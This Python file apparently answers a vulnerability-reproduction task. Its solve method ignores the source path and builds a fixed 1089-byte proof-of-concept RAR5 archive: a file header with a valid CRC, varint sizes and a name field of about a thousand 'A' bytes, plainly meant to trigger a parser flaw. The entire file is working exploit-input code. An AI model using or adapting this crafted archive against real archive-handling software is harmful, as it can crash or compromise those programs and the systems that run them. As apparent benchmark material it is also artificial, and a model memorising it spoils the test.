import struct
import zlib

def write_varint(n):
    b = bytearray()
    while True:
        byte = n & 0x7F
        n >>= 7
        if n == 0:
            b.append(byte)
            break
        else:
            b.append(byte | 0x80)
    return bytes(b)

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ignore src_path, generate fixed PoC based on analysis.
        # Target total PoC length: 1089 bytes.
        signature = b'Rar!\x1a\x07\x01\x00'  # 8 bytes
        target_total = 1089
        header_total = target_total - len(signature)  # should be 1081

        # We'll determine the name length that yields header_total.
        # Base header fields (type, flags, mtime, attr) each 1 byte.
        base_fields_len = 4
        # Iterate to find correct name_len
        name_len = header_total - 8  # initial guess (without Lhs, Lns)
        while True:
            # Compute varint lengths for name_size and header_total
            name_size_varint = write_varint(name_len)
            Lns = len(name_size_varint)
            # Estimate Lhs using current guess for header_total
            header_size_varint = write_varint(header_total)
            Lhs = len(header_size_varint)
            computed_header_total = 4 + Lhs + base_fields_len + Lns + name_len
            if computed_header_total == header_total:
                # Verify that the header_size_varint we computed matches the actual header_total
                if write_varint(computed_header_total) == header_size_varint:
                    break
                # If not, adjust name_len and recompute
            # Adjust name_len to close the gap
            diff = header_total - computed_header_total
            if diff == 0:
                break
            name_len += diff
            if name_len < 0:
                raise RuntimeError("Cannot find valid name length")
        # Now we have stable lengths
        # Build header content (after CRC)
        header_content = bytearray()
        header_content.extend(write_varint(2))      # type: file header
        header_content.extend(write_varint(0))      # flags: no extra, no data
        header_content.extend(write_varint(0))      # modification time
        header_content.extend(write_varint(0))      # file attributes
        header_content.extend(write_varint(name_len))  # name size
        header_content.extend(b'A' * name_len)      # name data

        # Prepend header size varint
        header_size_varint = write_varint(header_total)
        full_header_without_crc = bytearray()
        full_header_without_crc.extend(header_size_varint)
        full_header_without_crc.extend(header_content)

        # Compute CRC32 of full_header_without_crc
        crc = zlib.crc32(full_header_without_crc) & 0xFFFFFFFF
        crc_bytes = struct.pack('<I', crc)

        # Final header: CRC + full_header_without_crc
        final_header = crc_bytes + full_header_without_crc

        # Entire archive
        archive = signature + final_header

        # Double-check length
        assert len(archive) == target_total, f"Expected {target_total}, got {len(archive)}"
        return bytes(archive)